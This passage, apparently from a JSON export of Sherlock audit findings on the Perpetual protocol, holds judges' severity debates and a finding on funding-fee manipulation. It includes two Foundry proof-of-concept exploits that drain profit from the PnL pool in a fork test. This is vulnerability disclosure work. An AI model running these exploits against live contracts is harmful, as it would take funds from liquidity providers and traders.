admin and external admin.\n- Because admins are trusted, whichever endpoint that is used to relay orders are also trusted to be live and relaying the correct information. \n- If your own network has a problem, then it's your problem, and completely out of scope. \n\n**nevillehuang**\n\n@midori-fuse Given this constraint [highlighted here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/25#issuecomment-2043867651), I believe medium severity is appropriate. Do you agree?\n\n**midori-fuse**\n\nNo, unfortunately I don't agree that the constraint makes sense. \n\nFirst of all, as I have stated, network congestion related factors are related to the external admin and your own network, which has to be assumed to be trusted to provide reliable service.\n\nSecond of all, even given that \"constraint\", you can open orders, say, two seconds apart, for a completely negligible oracle price difference with the same bypassing effect, and the risk that the price moves sharply within those two seconds is epsilon.\n\n**nirohgo**\n\nTo clarify, this in not due to a problem in network congestion, or a problem with the internet on any side (sender or receiver). It's just the way that TCP/IP works. Two messages leaving from point A to B at virtually the same time can and often do take entirely different routes and arrive at different times (and order). Also, because any random order may shift the position direction, orders that interfere include orders that left well before the attacker's.\n\n**midori-fuse**\n\nEven so, it does not change the fact that two orders can still be made one after another, in a reliable fashion by introducing a very small delay between them. \n\nAnd even without the attack, we have shown that large trades has no price impact compared to smaller trades that makes up the same sum. Because this results in both:\n- Exposure to higher risk against the same price sum, equating to a guaranteed loss.\n- Enables a path that bypasses the spread directly, forcing the maker to quote a higher price than design. The mentioned risk can be controlled by choosing the appropriate delay between orders, and literally just by having a stable connection. \n  - Furthermore the Maker has to actually change position from negative to positive and vice-versa in the meantime, which we believe is too high of an assumption to be considered an attack risk.\n\nwe still believe this is a High risk issue.\n\n**Czar102**\n\nI think this report lies on the Med/High borderline, but closer to the Medium severity issue – the loss is only the loss of fees, the attacker has no way of predicting the price anyway.\n\nI don't think the point in @nirohgo's escalation weights a lot into this judgment.\n\nPlanning to reject both escalations and leave the issue as is.\n\n**midori-fuse**\n\nIt is indeed true that the loss is only a loss of fees (even if it can be bypassed completely).\n\nHowever the loss here is directed towards Oracle Maker LPs and not the protocol. Furthermore, the issue isn't about a price-based attack, it's a general trick/exploit path to open better positions than the design for traders. The higher the Maker's position, the higher the fee loss, since the premium there is also larger.\n\nSo I still think it's a High, since I see loss of fees towards LPs equates to loss of funds. \n\nHowever I do believe the context on the issue is clear now, and it's a matter of judgement instead of on further analyzing the issue.\n\n**WangSecurity**\n\nAgree with what Czar said above, the only loss are fees and the attack depends on external factors to be true, since the caller cannot control if their transactions will be executed one right after another.\n\nPlanning to reject the escalation and leave the issue as it is.\n\n**Evert0x**\n\nResult:\nMedium\nHas Duplicates\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [midori-fuse](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/25/#issuecomment-2037044881): rejected\n- [nirohgo](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/25/#issuecomment-2041346175): rejected\n\n**nirohgo**\n\n@Evert0x my escalation should not be rejected here because it affected the decision on the original escalation (\"the only loss are fees and the attack depends on external factors to be true, since the caller cannot control if their transactions will be executed one right after another.\") my escalation demonstrated that  the caller cannot control if their transactions will be executed one right after another.",
      "summary": "\nThe OracleMaker's `_getBasePriceWithSpread()` function does not properly take into account the size of the opening position, only the current position. This means there is no protection against large trades and anyone can bypass the spread by opening a reverse position before their intended position. This issue can result in a loss for the Oracle Maker and exposes them to more risk than intended. The vulnerability was found through manual review and it is recommended that the `_getBasePriceWithSpread()` function is updated to consider the average spread of the Maker's position before and after the trade. The impact of this issue is considered to be medium and there are no known external conditions needed for the attack to be successful. However, there is some debate about the severity of the issue and it has been labeled as medium with duplicates.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/25",
      "tags": [],
      "finders": [
        "PUSH0",
        "IllIllI"
      ]
    },
    {
      "id": "32163",
      "title": "H-2: Funding Fee Rate is calculated based only on the Oracle Maker's skew but applied across the entire market, which enables an attacker to generate an extreme funding rate for a low cost and leverage that to their benefit",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nIllIllI, ge6a, ihavebigmuscle, joicygiore, nirohgo\n## Summary\n\nThe fact that the Funding Fee rate is calculated only based on the Oracle Maker's position skew enables an exploiter to open a large long position on the Oracle Maker that generates an extreme funding fee paid by long takers, and then close the position (+open an opposite one) on the SpotHedge maker within the same block while maintaining the funding fee value and direction. This can be used to generate various attacks as detailed below.\n\n## Vulnerability Detail\n\nPerpetual uses funding fee to balance between long and short positions, mainly to balance/reduce exposure of the Oracle Maker (from the docs: *\"In our system, having a funding fee will be beneficial for the Oracle Pool\"*. Presumably for this reason the funding rate is calculated based only on the Oracle Maker's position skew as can be seen in this code snippet taken from the getCurrentFundingRate function (note that basePool is neccesarily the Oracle Maker since it is type-casted to OracleMaker in the code):\n```solidity\n        // we can only use margin without pendingMargin as totalDepositedAmount\n        // since pendingMargin includes pending borrowingFee and fundingFee,\n        // it will be infinite loop dependency\n        uint256 totalDepositedAmount = uint256(_getVault().getSettledMargin(marketId, fundingConfig.basePool));\n        uint256 maxCapacity = FixedPointMathLib.divWad(\n            totalDepositedAmount,\n            uint256(OracleMaker(fundingConfig.basePool).minMarginRatio())\n        );\n```\nHowever, the funding fee applies to **any position** in the market (as can be seen in the [Vault::settlePosition](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/vault/Vault.sol#L139) function) which enables an exploiter to create a very high funding rate for a low cost by opening a large long position on the oracle maker and close the position immediately after on the HSBM maker (possibly also opening a short depending on the type of attack).  Since the opposite position does not affect the funding rate (as it is settled with the SpotHedge maker), the funding rate will maintain its extreme value and its direction. \n\nThis maneuver can generate multiple types of attacks that can be conducted individually or combined:  \n\n**A. Griefing/Liquidation attack** - The attacker creates an extreme funding rate that causes immediate loss to position holders of the attacked direction, possibly making many positions liquidatable on the next block. This attack is conducted as follows:  \nA.1. Attacker opens a maximal long position on the oracle maker creating an extremely high funding rate paid by longs.\nA.2. Attacker closes their long position using the HSBM maker. This means the extreme high funding rate is unaffected since its calculated based on the oracle maker only. (A1 and A2 can be done in an atomic transaction from an attacker contract).  \nA.3. Starting from the next block any long position in the system incures a very high cost per block, likely making many positions liquidatable immediately.  \nA.4. The cost for the attacker is only the negative PnL caused by the spread between the oracle and HSBM makers. The attacker can offset the cost and make a profit by running a transaction at the start of the next block that liquidates all positions that were liquidated by the move (the attacker has information advantage over other liquidators and are likely to win the liquidations).  \n\n**B. Profiting from large funding fee within one block by also opening a short (exfiltrating funds from the PnL pool).**  \nB.1. the attack starts similarly to A: the attacker opens a maximal long position on the OM and then a counter short position on the HSBM maker, only this time the attacker also opens a short on the SpotHedge maker that gains the attacker funding fees starting from the next block.  \nB.2. The attacker can close the short position at the start of the next block to reduce risk, taking profit from the fee paid for the one block, in addition to liquidating any affected positions as in scenario A.  \nB.3. The cost of attack: negative PnL caused by spread between the two makers, plus borrowing fee. However because borrowing fee does not grow exponentially with utilization rate like the funding fee, it is covered by the funding fee with a profit.\n\n**C. Profiting from a large deposit to the oracle maker/withdraw within one block.**  \nC.1.  The attack runs the same as scenario A, only the attacker also makes a large deposit to the oracle maker, and withdraws on the next block.  \nC.2. Since share values take into account pending fees, the share value will increase significantly from one block to the next because the oracle maker will also get a high funding fee within that one block (this is because oracle maker also holds a large short position as a result of the attackers initial postion, that gets paid funding fee). Note that in this scenarion the attacker needs to verify that there is no expected loss to share value between these two blocks\n\n\n\n\nThe POC below shows how with reasonable market considitions the attacker can make a significant profit, specifically using only attack type B.\n\n\n\n### POC\nThe following POC shows the scenario where the attacker generates a high funding rate paid by longs, while opening a large short position for themselves, then on the next block the attacker closes the short with a significant gain from funding fee (while the HSBM maker pays the funding fee)\n\nTo run:  \nA. create a test.sol file under the perp-contract-v3/test/spotHedgeMaker/ folder and add the code below to it.\nB. Run forge test --match-test testFundingFeePOC -vv\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\n\ncontract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"Taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        //create oracle maker\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n\n        //PARAMETERS SETUP\n\n        //fee setup\n        //funding fee configs (taken from team tests) \n        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        \n\n        //whitelist users\n        oracle_maker.setValidSender(exploiter,true);\n        oracle_maker.setValidSender(taker,true);\n        \n\n        //add more liquidity ($20M) to uniswap pool to simulate realistic slippage\n        deal(address(baseToken), spotLp, 10000e9, true);\n        deal(address(collateralToken), spotLp, 20000000e6, true);\n        vm.startPrank(spotLp);\n        uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(collateralToken),\n                token1: address(baseToken),\n                fee: 3000,\n                tickLower: -887220,\n                tickUpper: 887220,\n                amount0Desired: collateralToken.balanceOf(spotLp),\n                amount1Desired: baseToken.balanceOf(spotLp),\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: spotLp,\n                deadline: block.timestamp\n            })\n        );\n \n\n        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n\n    function testFundingFeePOC() public {\n       \n\n        //deposit 5M collateral as margin for exploiter (also mints the amount)\n        uint256 startQuote = 5000000*1e6;\n       _deposit(marketId, exploiter, startQuote);\n       console.log(\"Exploiter Quote balance at Start: %s\\n\", startQuote);\n\n        //deposit to makers\n        //initial HSBM maker deposit: 2000 base tokens ($4M)\n       vm.startPrank(makerLp);\n       deal(address(baseToken), makerLp, 2000*1e9, true);\n       baseToken.approve(address(maker), type(uint256).max);\n       maker.deposit(2000*1e9);\n\n       //initial oracle maker deposit: $2M (1000 base tokens)\n       deal(address(collateralToken), makerLp, 2000000*1e6, true); \n       collateralToken.approve(address(oracle_maker), type(uint256).max);\n       oracle_maker.deposit(2000000*1e6);\n       vm.stopPrank();\n\n       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity\n       _deposit(marketId, address(maker), 2000000*1e6);\n\n       //Exploiter opens the maximum possible (-1000 base tokens) long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1000*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        //Exploiter opens maximum possible short on the HSBM maker changing their position to short 1000 (2000-1000)\n        (posBase,openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 2000 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        console.log(\"Funding Fee Rate after short:\");\n        int256 ffeeRate = fundingFee.getCurrentFundingRate(marketId);\n        console.logInt(ffeeRate);\n        //OUTPUT:\n        // Funding Fee Rate after short:\n        //-388399804857866884\n\n        //move to next block\n        vm.warp(block.timestamp + 2 seconds);\n\n        //Exploiter closes the short to realize gains\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: exploiterPosSize.abs(),\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        //exploiter withdraws entirely\n        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));\n        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));\n        int256 marg = stDec-upDec;\n        uint256 margAbs = marg.abs();\n        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n        vault.transferMarginToFund(marketId,toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n        vm.stopPrank();\n\n        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        console.log(\"Exploiter Quote balance at End: %s\", finalQuoteBalance);\n        //OUTPUT: Exploiter Quote balance at End: 6098860645835\n        //exploiter profit  = $6,098,860 - $5,000,000 = $1,098,860\n    }\n}\n\n```\n\n\n## Impact\n\nThe various possible attacks detailed above generate immediate profits to the exploiter that can be withdrawn immediately if enough PnL exists in the pool, diluting the PnL pool on the expense of users and causing them financial loss from not being able to withdraw their profits. In addition, as detailed above many positions can be made liquidatable following the attack causing further damage.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/fundingFee/FundingFee.sol#L104\n\n## Tool used\n\nManual Review\nFoundry\n\n## Recommendations\n\nTo mitigate this issue it is essential to resolve the root cause: the fact that funding fee is set using only a part of the market (Oracle Maker). Instead, the entire market long/short positions should be used to determine the rate. This will prevent an exploiter from opening the counter position (that gains fee) without that position also affecting the funding rate.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium\n\n**takarez** commented:\n>  seem to be a dupp of 125 due to large deposit and the recommendation also; high(4)\n\n\n\n**vinta**\n\nConfirmed, valid! Thank you for reporting this issue!\n\n**paco0x**\n\nIf an attacker intentionally open position to make the Oracle Maker imbalanced and close position on SpotHedge maker. The cost of this action is the maker swap fees (we'll have swap fees in later update).\n\nWe expect there'll be two kinds arbitrageurs come in to help balance Oracle Maker's position.\n\n1. The slippage of Oracle Maker becomes a positive premium when helping balance Oracle Maker, so arbitrageurs can open reverse position on SpotHedge maker and close on Oracle Maker and earn the premium right away.\n\n2. Arbitrageurs who're willing to earn funding fees can take over Oracle Maker's position and hedge the position else where, while receiving the funding fee.\n\nIn my opinion, this one is a medium and we might not fix it in the near future.\n\n**nirohgo**\n\nEscalate\nThis should be a high according to Sherlock's definitions: Definite loss of funds without (extensive) limitations of external conditions. Inflicts serious non-material losses (doesn't include contract simply not working).\n\nSince no explanation was given to why this got demoted to medium I'll assume this was following the sponsor's comments, which I'll address here:\n1. The sponsor mentioned maker swap fees that will be added in a later update and contribute to the cost of the attack, however these were not mentioned in the contest readme nor in the code and therefore should not affect severity but rather be considered a possible remediation method.\n2. The sponsor also mentions two types of arbitrageurs that are expected to balance the Oracle Maker's position, however arbitrageurs are irrelevant to this exploit because the attack is conducted within two consecutive blocks (first part block X, second part - block X+1). Since Optimism's mempool is private the attacker is the only one with pre-knowledge of phase 1, and can easily avoid being frontrun on block X+1.\n3. Regarding \"The slippage of Oracle Maker becomes a positive premium when helping balance Oracle Maker\" I believe this is inaccurate: When helping balance the Oracle Maker it gives exactly the Oracle price. Opening a reverse position on SpotHedge maker and closing on Oracle Maker involves some loss because of the SpotHedge maker price slippage (slightly worse than the oracle price due to Uniswap slippage/fees).\n\nThe POC clearly demonstrates:  \nA. a substantial financial loss  (see POC output).  \nB. Without excessive reliance on external conditions.\n\n**sherlock-admin2**\n\n> Escalate\n> This should be a high according to Sherlock's definitions: Definite loss of funds without (extensive) limitations of external conditions. Inflicts serious non-material losses (doesn't include contract simply not working).\n> \n> Since no explanation was given to why this got demoted to medium I'll assume this was following the sponsor's comments, which I'll address here:\n> 1. The sponsor mentioned maker swap fees that will be added in a later update and contribute to the cost of the attack, however these were not mentioned in the contest readme nor in the code and therefore should not affect severity but rather be considered a possible remediation method.\n> 2. The sponsor also mentions two types of arbitrageurs that are expected to balance the Oracle Maker's position, however arbitrageurs are irrelevant to this exploit because the attack is conducted within two consecutive blocks (first part block X, second part - block X+1). Since Optimism's mempool is private the attacker is the only one with pre-knowledge of phase 1, and can easily avoid being frontrun on block X+1.\n> 3. Regarding \"The slippage of Oracle Maker becomes a positive premium when helping balance Oracle Maker\" I believe this is inaccurate: When helping balance the Oracle Maker it gives exactly the Oracle price. Opening a reverse position on SpotHedge maker and closing on Oracle Maker involves some loss because of the SpotHedge maker price slippage (slightly worse than the oracle price due to Uniswap slippage/fees).\n> \n> The POC clearly demonstrates:  \n> A. a substantial financial loss  (see POC output).  \n> B. Without excessive reliance on external conditions.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IllIllI000**\n\nIf this one is High, then so is https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126 , because they both are the pattern `X Fee Rate is calculated based only on the Y Maker's skew but applied across the entire market, which enables an attacker to generate an extreme X rate for a low cost and leverage that to their benefit`, where X is either Funding or Borrowing and Y is either Oracle or SpotHedge\n\n**nevillehuang**\n\nI think I agree with @nirohgo and high severity here, subsequent update to fees shouldn't be considered if not make known initially.\n\n**gstoyanovbg**\n\n@nevillehuang You may want to consider the risks from [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/125#issuecomment-2048307145) comment.\n\n**IllIllI000**\n\n@nevillehuang the ability to attack the protocol depends on the values that the admin sets in the configuration. As I point out [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/127#issuecomment-2045357110), the attack can no longer be performed when the funding fee rate is reduced. I believe this prevents the severity from being High, since admins are trusted to use the right values for their protocol, or else they could just choose ones that 'happen' to cause an exploit, where Sherlock would be on the hook for it. It may even be Low if nirohgo can't show that it can be exploited _regardless_ of the value that the admin sets.\n\n**WangSecurity**\n\nI believe this issue should indeed be high. I see that with not all values the attack is possible, but since the values were taken from other tests by the team, therefore, I think it's safe to assume that these values are intended and default. Hence, as of now, planning to accept the escalation and update the severity to high. \n\n**IllIllI000**\n\n@paco0x there is only a [single setting](https://github.com/search?q=repo%3Asherlock-audit%2F2024-02-perpetual+setFundingConfig&type=code) of the values for the parameters. Can you let us know what sort of ranges you expect for the funding parameters, so we can see how much this issue is affected by the expected values? The [desmos](https://www.desmos.com/calculator/n4ilkhsbn1) calculator the docs links to has some ranges - are they representative?\n\n**paco0x**\n\n> @paco0x there is only a [single setting](https://github.com/search?q=repo%3Asherlock-audit%2F2024-02-perpetual+setFundingConfig&type=code) of the values for the parameters. Can you let us know what sort of ranges you expect for the funding parameters, so we can see how much this issue is affected by the expected values? The [desmos](https://www.desmos.com/calculator/n4ilkhsbn1) calculator the docs links to has some ranges - are they representative?\n\nConsidering the potential issues, we'll not enable funding fee in our first version in production. \n\nThe approximate range of funding rate to begin with can be between 100% and 500% per year under max imbalance ratio. An example config can be:\n\n```\nFundingConfig {\n    fundingFactor: 200% / 86400  (200% per year under max imbalance ratio)\n    fundingExponentFactor: 1\n}\n```\n\n**IllIllI000**\n\n@WangSecurity according to the above, the expected exponent is 1.0, but the test is using 1.3, which is an extreme value. When the test is changed to use 1.0, the attacker no longer shows a profit and instead shows a loss (even with changing the uniswap fee down to 0.05%). Since it's conditional on the admin choosing an extreme value, I don't think this finding can be a High. I believe the rules about admin-controlled values being an admin error and thus invalid, are in place so that people doing the judging contest can correctly decide severity without having to ask the sponsor for the expected values.\n\n**nirohgo**\n\n@WangSecurity I discussed possible values of these configs with @42bchen during the contest, his answer was that they don't yet know what production values are going to be (which makes sense as they need to be effective to incentivize the right behavior). Given that, their final values can only be known in production, and limiting them in order to avoid an exploit (even if done as a workaround) should not take away from the finding severity.\n\nOn another matter (@Evert0x ), is it within Sherlock rules for a watson to \"escalate\" a finding, post the escalation period? (and without risking their escalation ratio)? seems somewhat unfair.\n\n**IllIllI000**\n\nThe finding was escalated by the submitter in order to raise the severity, and I'm trying to show why it should not be. I don't see how pointing out the usual rules is an unfair argument as to why it should not be a High\n\n**WangSecurity**\n\n@nirohgo can you provide a screenshot or a link to these messages, just so I can be sure, still deciding on the severity and validity here and will provide my decision tomorrow. Thanks to both of watsons for being active on providing additional info\n\n**gstoyanovbg**\n\nI disagree that the administrator can prevent the exploitation of this vulnerability. That's why when I submitted my report, I chose High severity. The assertion that changing the exponent from 1.3 to 1.0 will make the exploit impossible is true only for the proof of concept shown in this report, but not as a whole. LP can influence the total amount of deposits, and by exploiting this, an attacker can make a profit. It is not mandatory for the position to be closed in the next block; it could be in the one after that, for example. A combined attack is possible by opening a position and changing the total deposited amount. There are many attack scenarios, but there are no limiting factors that make it impossible. Exploiting this vulnerability boils down to risk management in order to choose the right approach for the respective state of the protocol. I tried to explain this in my report, but my choice to show a different attack path from the obvious one led to the escalation of my report. I've said it before, but in my opinion, it cannot be expected that all possible ways to exploit a vulnerability will be presented in one report; it is not practical.\n\n**WangSecurity**\n\nI think medium severity is appropriate here. The attack is indeed profitable with 1.3e18, but unprofitable with 1.0e18. It's also profitable with 1.2e18, but unprofitable with 1.1e18. I see that the sponsor says the approximate funding exponent will be indeed 1. But, as we see from nirohgo point, he asked about it during the contest and the sponsor answered they don't know yet. Moreover, I don't the rule that the admin should always set the correct value can be applied here, cause (as I understand) setting the exponent to 1.2e18+ doesn't disrupt the work of the protocol, but opens a window for the attack. Hence, I see at as a valid attack with certain constraints and state to be executed profitably.\n\nHence, I'm planning to reject the escalation and leave the issue as it is.\n\n**nirohgo**\n\n@WangSecurity according to sherlock rules and definitions this should be a high. Your reasoning for medium rely on 1. a \"counter escalation\" that was made against sherlock rules (after escalation period was over)  2. against the information that was provided during the contest (the test config values plus communication that more precise values are not yet known) and therefore lower on Sherlock's hierarchy of truth.\n\n**WangSecurity**\n\nI'm judging it accroding to rules for Medium Severity:\n\n> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained.\n\n1. There is only one escalation that was raised by you. Another Watson is just giving his points why this should remain invalid and it's not against the rules.\n2. My judging is not based on the info regarding funding exponent provided after the contest. If it was based on it, then this finding would be invalid. But medium severity is based on that fact, that if funding exponent is 1.3e18 or 1.2e18 the attack is profitable. If it's 1.1e18 or 1.0e18 then it's unprofittable. Hence, \"requires certain external conditions or specific states\".\n\nMy decision remains the same: reject the escalation and leave the issue as it is.\n\n**nirohgo**\n\n@WangSecurity every finding requires some conditions or specific states. (for example #123, which was accepted as High, requires that there be two offline Pyth price updates that were not reported onchain yet at that the price diff between them enables the attack). My point in the case of this finding is that (given the information available during the audit - that production configs are not known and only provided estimate is the one in the tests) is there is no reason to believe 1.1e18 or 1.0e18 are more likely than  1.3e18 or 1.2e18. Therefore I do not believe that specific handpicked exponent values where the attack does not work should count as  a strong enough dependency on certain external conditions or specific states to make this a medium. Also, the severity of loss (as displayed in the POC) should also be taken into account here when determining the severity. (from my experience many accepted high's on sherlock may not work given specific config settings, and yet still count as high because  they will occur with reasonably set configs and cause significant loss).\n\n**WangSecurity**\n\n@nirohgo I see your points and I'm open to discussing them, but before that I would like to get a small clarification from your side. In issue #116 you say that setting \"the OM max spread to a larger value than the price band setting\", i.e. admin setting the values that open a window for the vulnerability is an admin error. But in that case admin setting the values that open a window for the vulnerability is not an admin error. I understand it's two completely different issues, but I believe in both cases the trusted admin rule should be applied correctly. What do you think about it?\n\n**gstoyanovbg**\n\n@WangSecurity Perhaps my question is naive, but what is the intuition behind the statement that the attack is not profitable with 1.0e18? I examined nirohgo's proof of concept in more detail, and in my opinion, the problem with it is that there is not enough liquidity in the corresponding range, leading to significant slippage. I added liquidity to the respective range, and the attack became profitable. I reduced the fee from 0.3 to 0.05 to show a greater profit, but with 0.3, smaller profits are also possible.\n\n<details>\n<summary>Modified POC</summary>\n\n```solidity\ncontract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"Taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        //create oracle maker\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n\n        //PARAMETERS SETUP\n\n        //fee setup\n        //funding fee configs (taken from team tests) \n        config.setFundingConfig(marketId, 0.005e18, 1.0e18, address(oracle_maker));\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        \n\n        //whitelist users\n        oracle_maker.setValidSender(exploiter,true);\n        oracle_maker.setValidSender(taker,true);\n        \n\n        //add more liquidity ($20M) to uniswap pool to simulate realistic slippage\n        deal(address(baseToken), spotLp, 2500e9, true);\n        deal(address(collateralToken), spotLp, 5000000e6, true);\n        vm.startPrank(spotLp);\n        uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(collateralToken),\n                token1: address(baseToken),\n                fee: 500,\n                tickLower: -6940,\n                tickUpper: -6920,\n                amount0Desired: collateralToken.balanceOf(spotLp),\n                amount1Desired: baseToken.balanceOf(spotLp),\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: spotLp,\n                deadline: block.timestamp\n            })\n        );\n \n        //(,  int24 tick, , , , , ) = IUniswapV3PoolState(uniswapV3SpotPool).slot0();\n        //console.logInt(tick);\n\n        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n\n    function testFundingFeePOC() public {\n       \n\n        //deposit 5M collateral as margin for exploiter (also mints the amount)\n        uint256 startQuote = 5000000*1e6;\n       _deposit(marketId, exploiter, startQuote);\n       console.log(\"Exploiter Quote balance at Start: %s\\n\", startQuote);\n\n        //deposit to makers\n        //initial HSBM maker deposit: 2000 base tokens ($4M)\n       vm.startPrank(makerLp);\n       deal(address(baseToken), makerLp, 2000*1e9, true);\n       baseToken.approve(address(maker), type(uint256).max);\n       maker.deposit(2000*1e9);\n\n       //initial oracle maker deposit: $2M (1000 base tokens)\n       deal(address(collateralToken), makerLp, 2000000*1e6, true); \n       collateralToken.approve(address(oracle_maker), type(uint256).max);\n       oracle_maker.deposit(2000000*1e6);\n       vm.stopPrank();\n\n       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity\n       _deposit(marketId, address(maker), 2000000*1e6);\n\n        \n        \n\n       //Exploiter opens the maximum possible (-1000 base tokens) long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1000*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n\n        //Exploiter opens maximum possible short on the HSBM maker changing their position to short 1000 (2000-1000)\n        (posBase,openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 2000 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        console.log(\"Funding Fee Rate after short:\");\n        int256 ffeeRate = fundingFee.getCurrentFundingRate(marketId);\n        console.logInt(ffeeRate);\n        //OUTPUT:\n        // Funding Fee Rate after short:\n        //-388399804857866884\n\n        //move to next block\n        vm.warp(block.timestamp + 2 seconds);\n\n        //Exploiter closes the short to realize gains\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: exploiterPosSize.abs(),\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        \n\n        //exploiter withdraws entirely\n        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));\n        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));\n        int256 marg = stDec-upDec;\n        uint256 margAbs = marg.abs();\n        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n        vault.transferMarginToFund(marketId,toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n        vm.stopPrank();\n\n        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        console.log(\"Exploiter Quote balance at End: %s\", finalQuoteBalance);\n        //OUTPUT: Exploiter Quote balance at End: 6098860645835\n    